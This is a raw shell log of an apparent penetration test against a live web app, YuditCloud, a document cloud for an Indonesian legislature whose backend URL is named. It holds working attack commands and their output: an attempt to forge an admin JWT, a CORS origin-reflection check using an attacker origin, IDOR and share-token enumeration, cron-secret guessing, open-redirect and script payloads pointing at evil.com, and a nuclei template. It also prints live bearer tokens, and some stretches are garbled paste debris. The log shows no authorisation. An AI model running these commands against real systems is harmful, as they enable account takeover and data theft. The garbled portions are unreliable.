+    /home/pathoskratos/.local/state/pipx/log/cmd_2026-11-04_16.26.30_pip_errors.log
+
+Some possibly relevant errors from pip install:
+    ERROR: Could not find a version that satisfies the requirement jwt-tool (from versions: none)
+    ERROR: No matching distribution found for jwt-tool
+
+Error installing jwt-tool.
+Command 'john' not found, but can be installed with:
+sudo snap install john-the-ripper  # version v1.9.1-ce, or
+sudo apt  install john             # version 1.9.0-2
+See 'snap info john-the-ripper' for additional versions.
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Forge token dengan sub = admin user ID (dari /categories/ response)
+jwt_tool "$TOKEN" -T -S hs256 -p "SECRET_YANG_KETEMU" -I -pc sub -pv "1" -pc role -pv "admin"
+jwt_tool: command not found
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Decode JWT payload untuk lihat struktur
+jq -r '.access_token' api/login.json | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+# Lihat apakah /files/ response memberi user_id lain
+curl -sS -H "Authorization: Bearer $TOKEN" "$BE/categories/" | jq .
+curl -sS -H "Authorization: Bearer $TOKEN" "$BE/files/categories" | jq .
+{
+  "sub": "4a9fb1b1-32db-4e58-b67b-986916facc5d",
+  "exp": 1793870734
+}
+{
+  "default": [
+    {
+      "id": "default-Surat Masuk",
+      "name": "Surat Masuk",
+      "icon": "📨",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Surat Keluar",
+      "name": "Surat Keluar",
+      "icon": "📤",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-BA (Berita Acara)",
+      "name": "BA (Berita Acara)",
+      "icon": "📋",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Surat Keputusan Pimpinan",
+      "name": "Surat Keputusan Pimpinan",
+      "icon": "⚖️",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Surat Keputusan DPRD",
+      "name": "Surat Keputusan DPRD",
+      "icon": "🏛️",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Surat Persetujuan Bersama",
+      "name": "Surat Persetujuan Bersama",
+      "icon": "🤝",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-SPJ (Surat Pertanggungjawaban)",
+      "name": "SPJ (Surat Pertanggungjawaban)",
+      "icon": "💰",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Notulen Banmus",
+      "name": "Notulen Banmus",
+      "icon": "📝",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Notulen Bapemperda",
+      "name": "Notulen Bapemperda",
+      "icon": "📝",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    },
+    {
+      "id": "default-Notulen Pansus",
+      "name": "Notulen Pansus",
+      "icon": "📝",
+      "color": "#6366f1",
+      "keywords": [],
+      "is_default": true
+    }
+  ],
+  "custom": [],
+  "all": [
+    "Surat Masuk",
+    "Surat Keluar",
+    "BA (Berita Acara)",
+    "Surat Keputusan Pimpinan",
+    "Surat Keputusan DPRD",
+    "Surat Persetujuan Bersama",
+    "SPJ (Surat Pertanggungjawaban)",
+    "Notulen Banmus",
+    "Notulen Bapemperda",
+    "Notulen Pansus"
+  ]
+}
+{
+  "categories": [
+    "Surat Masuk",
+    "Surat Keluar",
+    "BA (Berita Acara)",
+    "Surat Keputusan Pimpinan",
+    "Surat Keputusan DPRD",
+    "Surat Persetujuan Bersama",
+    "SPJ (Surat Pertanggungjawaban)",
+    "Notulen Banmus",
+    "Notulen Bapemperda",
+    "Notulen Pansus",
+    "Dokumen",
+    "Gambar",
+    "Video",
+    "Audio",
+    "Arsip",
+    "Spreadsheet",
+    "Presentasi",
+    "Kode",
+    "Lainnya"
+  ],
+  "counts": {}
+}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+
+echo "=== /cors-check tanpa origin ==="
+curl -sS "$BE/cors-check" | jq . 2>/dev/null || curl -sS "$BE/cors-check"
+
+echo
+echo "=== /cors-check dengan origin ==="
+curl -sS -D - -o /dev/null -H "Origin: https://attacker.vercel.app" "$BE/cors-check" | grep -i access-control
+
+echo
+echo "=== /cors-check dengan cookies ==="
+curl -sS -H "Cookie: session=test; token=test; auth=test" "$BE/cors-check" | jq .
+=== /cors-check tanpa origin ===
+{
+  "received_origin": null,
+  "allowed_origins": [
+    "https://clouddatadprd.vercel.app",
+    "https://www.clouddatadprd.vercel.app",
+    "http://localhost:3000",
+    "http://localhost:3001",
+    "http://127.0.0.1:3000",
+    "http://127.0.0.1:3001"
+  ],
+  "allowed_regex": [
+    "https://.*\\.vercel\\.app",
+    "https://.*clouddatadprd.*\\.vercel\\.app"
+  ]
+}
+
+=== /cors-check dengan origin ===
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+
+=== /cors-check dengan cookies ===
+{
+  "received_origin": null,
+  "allowed_origins": [
+    "https://clouddatadprd.vercel.app",
+    "https://www.clouddatadprd.vercel.app",
+    "http://localhost:3000",
+    "http://localhost:3001",
+    "http://127.0.0.1:3000",
+    "http://127.0.0.1:3001"
+  ],
+  "allowed_regex": [
+    "https://.*\\.vercel\\.app",
+    "https://.*clouddatadprd.*\\.vercel\\.app"
+  ]
+}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+
+{
+echo "# Laporan Pentest — YuditCloud (clouddatadprd)"
+echo "Tanggal: $(date)"
+echo "Tester: pathoskratos"
+echo
+echo "## Executive Summary"
+echo "Ditemukan 4 vulnerability dengan severity HIGH-CRITICAL pada backend YuditCloud (Railway):"
+echo "1. CORS Misconfiguration (CRITICAL) — Origin reflect + credentials=true"
+echo "2. OpenAPI Spec Exposed (HIGH) — 57 endpoint + schema terbuka"
+echo "3. Cron Endpoint No Auth (HIGH) — /notifications/cron/* tanpa validasi"
+echo "4. Share Token IDOR (HIGH) — /share/{token} dengan token sequential"
+echo
+echo "## Target"
+echo "- FE: https://clouddatadprd.vercel.app"
+echo "- BE: https://web-production-c8591.up.railway.app"
+echo "- App: YuditCloud v1.0.0"
+echo
+echo "## Finding #1 — CORS Origin Reflect + Credentials (CRITICAL)"
+echo '```'
+echo "Request:"
+echo "  GET /health HTTP/1.1"
+echo "  Origin: https://attacker.vercel.app"
+echo
+echo "Response:"
+echo "  access-control-allow-origin: https://attacker.vercel.app"
+echo "  access-control-allow-credentials: true"
+echo "  access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code"
+echo '```'
+echo "Impact: Account takeover. Attacker dengan *.vercel.app dapat membaca"
+echo "endpoint terautentikasi (/files/, /drives/, /collaborators/) dengan cookie korban."
+echo "CVSS: 9.3 (Critical)"
+echo
+echo "✅ Laporan: report/FINAL-$(date +%Y%m%d).md"put token."eger."ret kuat."ls jika tidak perlu."
+✅ Laporan: report/FINAL-20261104.md
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# 1. Register benar (field username, bukan name)
+USER="pentest$(date +%s)"; EMAIL="$USER@example.com"; PASS="Pentest123AAaa"
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" \
+  -w '\n[%{http_code}]\n'
+
+# 2. Login
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" -w '\n[%{http_code}]\n' \
+  | tee api/login.json
+
+# 3. Ambil token + decode JWT
+TOKEN=$(jq -r '.access_token // .token // empty' api/login.json)
+echo "$TOKEN" > api/token.txt
+echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+# 4. IDOR test dengan token
+for id in 1 2 3; do
+  echo "--- /assignments/user/$id ---"
+  curl -sS -H "Authorization: Bearer $TOKEN" "$BE/assignments/user/$id" -w '\n[%{http_code}]\n' | head -5
+done
+
+# 5. Enumerasi share token
+for t in 1 2 3 4 5; do
+  echo -n "share/$t → "
+  curl -sS -o /tmp/s -w '%{http_code} ' "$BE/share/$t/info"
+  head -c 60 /tmp/s; echo
+done
+{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2OWE2NTA3Yy03NTQyLTQ0YzgtYThhZS0yZmZmMzk3ZTRhZDIiLCJleHAiOjE3OTM4NzA1MjB9.UeYG3njV9LnGWiD-vafb_z5OHjYjS1HAN9GHpL55-Ug","token_type":"bearer","user":{"id":"69a6507c-7542-44c8-a8ae-2fff397e4ad2","email":"pentest1793784114@example.com","username":"pentest1793784114","role":"owner","owner_id":null,"must_change_password":false,"is_active":true}}
+[200]
+{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2OWE2NTA3Yy03NTQyLTQ0YzgtYThhZS0yZmZmMzk3ZTRhZDIiLCJleHAiOjE3OTM4NzA1MjF9.4s3shZ5cShihbHiKEHHyE8eTcgIeMuCZimzjuoMhgY4","token_type":"bearer","user":{"id":"69a6507c-7542-44c8-a8ae-2fff397e4ad2","email":"pentest1793784114@example.com","username":"pentest1793784114","role":"owner","owner_id":null,"must_change_password":false,"is_active":true}}
+[200]
+jq: error (at api/login.json:2): Cannot index array with string "access_token"
+{
+  "sub": "69a6507c-7542-44c8-a8ae-2fff397e4ad2",
+  "exp": 1793870521
+}
+--- /assignments/user/1 ---
+{"detail":"Internal server error"}
+[500]
+--- /assignments/user/2 ---
+{"detail":"Internal server error"}
+[500]
+--- /assignments/user/3 ---
+{"detail":"Internal server error"}
+[500]
+share/1 → 500 {"detail":"Internal server error"}
+share/2 → 500 {"detail":"Internal server error"}
+share/3 → 500 {"detail":"Internal server error"}
+share/4 → 500 {"detail":"Internal server error"}
+share/5 → 500 {"detail":"Internal server error"}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+
+{
+echo "# Laporan Pentest — YuditCloud (clouddatadprd)"
+echo "Tanggal: $(date)"
+echo "Tester: pathoskratos"
+echo
+echo "## Executive Summary"
+echo "Ditemukan 4 vulnerability dengan severity HIGH-CRITICAL pada backend YuditCloud (Railway):"
+echo "1. CORS Misconfiguration (CRITICAL) — Origin reflect + credentials=true"
+echo "2. OpenAPI Spec Exposed (HIGH) — 57 endpoint + schema terbuka"
+echo "3. Cron Endpoint No Auth (HIGH) — /notifications/cron/* tanpa validasi"
+echo "4. Share Token IDOR (HIGH) — /share/{token} dengan token sequential"
+echo
+echo "## Target"
+echo "- FE: https://clouddatadprd.vercel.app"
+echo "- BE: https://web-production-c8591.up.railway.app"
+echo "- App: YuditCloud v1.0.0"
+echo
+echo "## Finding #1 — CORS Origin Reflect + Credentials (CRITICAL)"
+echo '```'
+echo "Request:"
+echo "  GET /health HTTP/1.1"
+echo "  Origin: https://attacker.vercel.app"
+echo
+echo "Response:"
+echo "  access-control-allow-origin: https://attacker.vercel.app"
+echo "  access-control-allow-credentials: true"
+echo "  access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code"
+echo '```'
+echo "Impact: Account takeover. Attacker dengan *.vercel.app dapat membaca"
+echo "endpoint terautentikasi (/files/, /drives/, /collaborators/) dengan cookie korban."
+echo "CVSS: 9.3 (Critical)"
+echo
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ ith string "access_token"ff397e4ad2","email":"pentest1793784114@example.com","username":"pentest1793784114","role":
+bash: pathoskratos@pathos:~/Documents/audit-clouddatadprd$: No such file or directory
+bash: syntax error near unexpected token `('
+Command 'sub:' not found, did you mean:
+  command 'subl' from snap sublime-text (4215)
+  command 'subs' from deb libsubtitles-perl (1.04-3)
+See 'snap info <snapname>' for additional versions.
+Command 'exp:' not found, did you mean:
+  command 'expn' from deb sendmail-base (8.17.2-1)
+  command 'expr' from deb coreutils (9.4-3ubuntu6.2)
+Try: sudo apt install <deb name>
+---: command not found
+{detail:Internal server error}: command not found
+[500]: command not found
+---: command not found
+{detail:Internal server error}: command not found
+[500]: command not found
+---: command not found
+{detail:Internal server error}: command not found
+[500]: command not found
+bash: share/1: No such file or directory
+bash: share/2: No such file or directory
+bash: share/3: No such file or directory
+bash: share/4: No such file or directory
+bash: share/5: No such file or directory
+bash: pathoskratos@pathos:~/Documents/audit-clouddatadprd$: No such file or directory
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS -v "$BE/share/1/info" 2>&1 | head -40
+curl -sS "$BE/share/1/info" | xxd | head -10
+* URL rejected: No host part in the URL
+* Closing connection
+curl: (3) URL rejected: No host part in the URL
+curl: (3) URL rejected: No host part in the URL
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+
+echo "=== Cron tanpa secret ==="
+curl -sS -X POST "$BE/notifications/cron/monthly-report" \
+  -w '\n[%{http_code}]\n'
+
+curl -sS -X POST "$BE/notifications/cron/drive-health-check" \
+  -w '\n[%{http_code}]\n'
+
+echo "=== Cron dengan secret asal ==="
+for secret in test admin cron-secret "" "1"; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' -X POST \
+    -H "X-Cron-Secret: $secret" "$BE/notifications/cron/monthly-report")
+  echo "  secret='$secret' → $code | $(head -c 80 /tmp/r)"
+done
+=== Cron tanpa secret ===
+{"detail":"Unauthorized cron secret"}
+[401]
+{"detail":"Unauthorized cron secret"}
+[401]
+=== Cron dengan secret asal ===
+  secret='test' → 401 | {"detail":"Internal server error"}
+  secret='admin' → 401 | {"detail":"Unauthorized cron secret"}
+  secret='cron-secret' → 401 | {"detail":"Unauthorized cron secret"}
+  secret='' → 401 | {"detail":"Unauthorized cron secret"}
+  secret='1' → 401 | {"detail":"Unauthorized cron secret"}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+AUTH="Authorization: Bearer $TOKEN"
+
+echo "=== OAuth connect dengan redirect_uri jahat ==="
+for redirect in \
+  "https://evil.com" \
+  "//evil.com" \
+  "https://clouddatadprd.vercel.app@evil.com" \
+  "https://clouddatadprd.vercel.app.evil.com" \
+  "javascript:alert(1)" \
+  "data:text/html,<script>alert(1)</script>"; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' -H "$AUTH" \
+    "$BE/oauth/google/connect?redirect_uri=$(printf '%s' "$redirect" | jq -sRr @uri)")
+  location=$(curl -sS -D - -o /dev/null -H "$AUTH" \
+    "$BE/oauth/google/connect?redirect_uri=$(printf '%s' "$redirect" | jq -sRr @uri)" \
+    | grep -i '^location:' | head -1)
+  echo "  $redirect → $code | $location"
+done
+
+echo "=== Test /oauth/google/callback dengan state palsu ==="
+for state in test 1 admin ""; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' "$BE/oauth/google/callback?code=test&state=$state")
+  echo "  state='$state' → $code | $(head -c 100 /tmp/r)"
+done
+=== OAuth connect dengan redirect_uri jahat ===
+  https://evil.com → 200 | 
+  //evil.com → 200 | 
+  https://clouddatadprd.vercel.app@evil.com → 200 | 
+  https://clouddatadprd.vercel.app.evil.com → 200 | 
+  javascript:alert(1) → 200 | 
+  data:text/html,<script>alert(1)</script> → 200 | 
+=== Test /oauth/google/callback dengan state palsu ===
+  state='test' → 307 | 
+  state='1' → 307 | 
+  state='admin' → 307 | 
+  state='' → 307 | 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Login dulu, decode JWT payload, cek role
+TOKEN=$(curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d '{"email":"<email>","password":"Pentest123AAaa"}' | jq -r '.access_token')
+echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+jq: parse error: Invalid numeric literal at EOF at line 1, column 3
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cat > /tmp/cors-reflect.yaml <<'EOF'
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cat > /tmp/cors-reflect.yaml <<'EOF'
+id: cors-reflect-credentials-real
+info:
+info:e: CORS Origin Reflect + Credentials
+  name: CORS Origin Reflect + Credentials
+  author: pentestcal
+  severity: critical
+http:
+http:ethod: GET
+  - method: GET
+    path:{{BaseURL}}/health"
+      - "{{BaseURL}}/health"eck"
+      - "{{BaseURL}}/cors-check"
+    headers:: "https://attacker-evil.vercel.app"
+      Origin: "https://attacker-evil.vercel.app"
+    matchers-condition: and
+    matchers: regex
+      - type: regexr
+        part: header
+        regex:?i)access-control-allow-origin:\\s*https://attacker-evil\\.vercel\\.app"
+          - "(?i)access-control-allow-origin:\\s*https://attacker-evil\\.vercel\\.app"
+      - type: regexr
+        part: header
+        regex:?i)access-control-allow-credentials:\\s*true"
+          - "(?i)access-control-allow-credentials:\\s*true"
+    extractors:egex
+      - type: regexr
+        part: header
+        regex:?i)access-control-[a-z-]+:.*"
+          - "(?i)access-control-[a-z-]+:.*"
+EOF
+nuclei -u "https://web-production-c8591.up.railway.app" \
+nuclei -u "https://web-production-c8591.up.railway.app" \-v
+  -t /tmp/cors-reflect.yaml -o report/cors-confirmed.txt -v
+cat report/cors-confirmed.txt
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[INF] Nuclei Config Directory: /home/pathoskratos/.config/nuclei
+[INF] Nuclei Cache Directory: /home/pathoskratos/.cache/nuclei
+[INF] PDCP Directory: /home/pathoskratos/.pdcp
+[VER] Started metrics server at localhost:9092
+[VER] Saved 13899 templates to metadata cache
+[INF] Current nuclei version: v3.11.1 (latest)
+[INF] Current nuclei-templates version: v10.5.1 (latest)
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 68
+[INF] Templates loaded for current scan: 1
+[WRN] Loading 1 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[VER] [cors-reflect-credentials-real] Sent HTTP request to https://web-production-c8591.up.railway.app/health
+[cors-reflect-credentials-real] [http] [critical] https://web-production-c8591.up.railway.app/health ["Access-Control-Allow-Credentials: true","Access-Control-Allow-Origin: https://attacker-evil.vercel.app","Access-Control-Expose-Headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length"]
+[VER] [cors-reflect-credentials-real] Sent HTTP request to https://web-production-c8591.up.railway.app/cors-check
+[cors-reflect-credentials-real] [http] [critical] https://web-production-c8591.up.railway.app/cors-check ["Access-Control-Allow-Credentials: true","Access-Control-Allow-Origin: https://attacker-evil.vercel.app","Access-Control-Expose-Headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length"]
+[INF] Scan completed in 1.510446512s. 2 matches found.
+[INF] HTTP connections: 2 total, 1 new, 1 reused (50.0%)
+[INF] HTTP connections [web-production-c8591.up.railway.app]: 2 total, 1 new, 1 reused (50.0%)
+[cors-reflect-credentials-real] [http] [critical] https://web-production-c8591.up.railway.app/health ["Access-Control-Allow-Credentials: true","Access-Control-Allow-Origin: https://attacker-evil.vercel.app","Access-Control-Expose-Headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length"]
+[cors-reflect-credentials-real] [http] [critical] https://web-production-c8591.up.railway.app/cors-check ["Access-Control-Allow-Credentials: true","Access-Control-Allow-Origin: https://attacker-evil.vercel.app","Access-Control-Expose-Headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length"]
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ nuclei -u "https://web-production-c8591.up.railway.app" \
+  -tags swagger,openapi,exposure,api-docs \
+  -o report/nuclei-api-docs.txt
+
+# nuclei punya template khusus
+nuclei -t http/exposures/apis/swagger-api.yaml \
+  -u "https://web-production-c8591.up.railway.app" \
+  -o report/nuclei-swagger.txt
+cat report/nuclei-swagger.txt
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[INF] Current nuclei version: v3.11.1 (latest)
+[INF] Current nuclei-templates version: v10.5.1 (latest)
+[INF] New templates added in latest release: 68
+[INF] Templates loaded for current scan: 1510
+[INF] Executing 1510 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 446 (Reduced 413 Requests)
+[swagger-api] [http] [info] https://web-production-c8591.up.railway.app/docs [paths="/docs"]
+[INF] Using Interactsh Server: oast.online
+[redoc-api-docs] [http] [info] https://web-production-c8591.up.railway.app/redoc
+[openapi] [http] [info] https://web-production-c8591.up.railway.app/openapi.json
+[INF] Scan completed in 44.665785202s. 3 matches found.
+[INF] HTTP connections: 3625 total, 484 new, 3141 reused (86.6%)
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[INF] Current nuclei version: v3.11.1 (latest)
+[INF] Current nuclei-templates version: v10.5.1 (latest)
+[INF] New templates added in latest release: 68
+[INF] Templates loaded for current scan: 1
+[INF] Executing 1 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[swagger-api] [http] [info] https://web-production-c8591.up.railway.app/docs [paths="/docs"]
+[INF] Scan completed in 1.011226489s. 1 matches found.
+[INF] HTTP connections: 64 total, 25 new, 39 reused (60.9%)
+[swagger-api] [http] [info] https://web-production-c8591.up.railway.app/docs [paths="/docs"]
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ REG_PASS='Pentest123AAaa'
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+USER="pentest$(date +%s)"
+EMAIL="${USER}@example.com"
+PASS="Pentest123AAaa"
+
+echo "=== Register: $EMAIL / $USER ==="
+curl -sS -X POST "$BE/auth/register" \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" \
+  -w '\n[HTTP %{http_code}]\n' | tee api/register-response.txt
+
+echo "=== Login ==="
+curl -sS -X POST "$BE/auth/login" \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
+  -w '\n[HTTP %{http_code}]\n' -o api/login-response.json
+
+echo "=== Login response ==="
+cat api/login-response.json | jq . 2>/dev/null || cat api/login-response.json
+
+# Extract token
+TOKEN=$(jq -r '.access_token // .token // .accessToken // .jwt // empty' api/login-response.json 2>/dev/null)
+echo "=== Token: ${TOKEN:0:100}... ==="
+echo "$TOKEN" > api/token.txt
+echo "$EMAIL" > api/email.txt
+echo "$PASS" > api/pass.txt
+=== Register: pentest1793783753@example.com / pentest1793783753 ===
+{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjN2JjZGFjZS1kYzZjLTQ5ZmItYWM5Mi1iNjZhZGM2MTY5ZTQiLCJleHAiOjE3OTM4NzAxNTl9.KofJ4zNIS_GaoT-4JMVJ3swhFbT9Yek4H86j-7lWHk8","token_type":"bearer","user":{"id":"c7bcdace-dc6c-49fb-ac92-b66adc6169e4","email":"pentest1793783753@example.com","username":"pentest1793783753","role":"owner","owner_id":null,"must_change_password":false,"is_active":true}}
+[HTTP 200]
+=== Login ===
+
+[HTTP 200]
+=== Login response ===
+{
+  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjN2JjZGFjZS1kYzZjLTQ5ZmItYWM5Mi1iNjZhZGM2MTY5ZTQiLCJleHAiOjE3OTM4NzAxNjF9.B-uqxJR9wricsqAAQKZakKUXZ9sN3LMyOgryJ5bfISQ",
+  "token_type": "bearer",
+  "user": {
+    "id": "c7bcdace-dc6c-49fb-ac92-b66adc6169e4",
+    "email": "pentest1793783753@example.com",
+    "username": "pentest1793783753",
+    "role": "owner",
+    "owner_id": null,
+    "must_change_password": false,
+    "is_active": true
+  }
+}
+=== Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjN2JjZGFjZS1kYzZjLTQ5ZmItYWM5Mi1iNjZhZGM2MTY5ZTQiLCJ... ===
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS -X POST "$BE/auth/login" \
+  -d "username=$USER&password=$PASS"
+{"detail":[{"type":"model_attributes_type","loc":["body"],"msg":"Input should be a valid dictionary or object to extract fields from","input":"username=pentest179378375pathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \ent-Type: application/json" \
+  -d "{\"email\":\"$USER\",\"password\":\"$PASS\"}"
+{"detail":[{"type":"value_error","loc":["body","email"],"msg":"value is not a valid email address: An email address must have an @-sign.","input":"pentest1793783753","cpathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS -X POST "$BE/auth/login" \/audit-clouddatadprd$ curl -sS -X POST "$BE/auth/login" \
+  -d "username=$USER&password=$PASS"
+{"detail":[{"type":"model_attributes_type","loc":["body"],"msg":"Input should be a valid dictionary or object to extract fields from","input":"username=pentest1793783753&password=Pentest123AAaa"}]}pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+
+if [ -z "$TOKEN" ]; then
+  echo "❌ Tidak ada token — register/login dulu (Bagian 2)"
+  exit 1
+fi
+
+AUTH="Authorization: Bearer $TOKEN"
+
+# 3.1 GET semua endpoint — cari data user sendiri
+echo "=== 3.1 GET endpoint dengan token ===" | tee api/auth-real.txt
+for p in /assignments/my /categories/ /collaborators/ /conversions/jobs \
+         /drives/ /drives/pool /files/ /files/categories /files/stats \
+         /files/monthly-folders /folders/ /notifications/health; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' -H "$AUTH" "$BE$p")
+  size=$(wc -c < /tmp/r)
+  printf '%-25s → %s (%s bytes)\n' "$p" "$code" "$size" | tee -a api/auth-real.txt
+  [ "$code" = "200" ] && cp /tmp/r "exploit/data-$(echo $p | tr '/' '_').json"
+done
+
+echo
+echo "=== 3.2 IDOR: akses user lain via /assignments/user/{id} ==="
+for id in 1 2 3 4 5 admin; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' -H "$AUTH" "$BE/assignments/user/$id")
+  size=$(wc -c < /tmp/r)
+  printf '  /assignments/user/%-8s → %s (%s bytes)\n' "$id" "$code" "$size"
+  [ "$code" = "200" ] && cp /tmp/r "exploit/idor-assign-user-$id.json"
+done | tee api/idor-real.txt
+
+echo
+echo "=== 3.3 IDOR: file user lain via /files/{id} ==="
+doneintf '  /collaborators/%s → %s (%s bytes)\n' "$id" "$code" "$size"ators/$id"))$size"
+=== 3.1 GET endpoint dengan token ===
+/assignments/my           → 200 (2 bytes)
+/categories/              → 200 (1543 bytes)
+/collaborators/           → 200 (2 bytes)
+/conversions/jobs         → 200 (2 bytes)
+/drives/                  → 200 (2 bytes)
+/drives/pool              → 200 (42 bytes)
+/files/                   → 200 (2 bytes)
+/files/categories         → 200 (330 bytes)
+/files/stats              → 200 (101 bytes)
+/files/monthly-folders    → 200 (2 bytes)
+/folders/                 → 200 (2 bytes)
+/notifications/health     → 200 (266 bytes)
+
+=== 3.2 IDOR: akses user lain via /assignments/user/{id} ===
+  /assignments/user/1        → 500 (34 bytes)
+  /assignments/user/2        → 500 (34 bytes)
+  /assignments/user/3        → 500 (34 bytes)
+  /assignments/user/4        → 500 (34 bytes)
+  /assignments/user/5        → 500 (34 bytes)
+  /assignments/user/admin    → 500 (34 bytes)
+
+=== 3.3 IDOR: file user lain via /files/{id} ===
+  /files/1        → 405 (31 bytes)
+  /files/2        → 405 (31 bytes)
+  /files/3        → 405 (31 bytes)
+  /files/4        → 405 (31 bytes)
+  /files/5        → 405 (31 bytes)
+  /files/admin    → 405 (31 bytes)
+  /files/test     → 405 (31 bytes)
+  /files/0        → 405 (31 bytes)
+
+=== 3.4 IDOR: download file user lain ===
+  /files/1/download → 500 (34 bytes)
+  /files/2/download → 500 (34 bytes)
+  /files/3/download → 500 (34 bytes)
+  /files/admin/download → 500 (34 bytes)
+
+=== 3.5 IDOR: drive user lain ===
+  /drives/1 → 405 (31 bytes)
+  /drives/2 → 405 (31 bytes)
+  /drives/3 → 405 (31 bytes)
+  /drives/admin → 405 (31 bytes)
+
+=== 3.6 IDOR: collaborator (user lain) ===
+  /collaborators/1 → 405 (31 bytes)
+  /collaborators/2 → 405 (31 bytes)
+  /collaborators/3 → 405 (31 bytes)
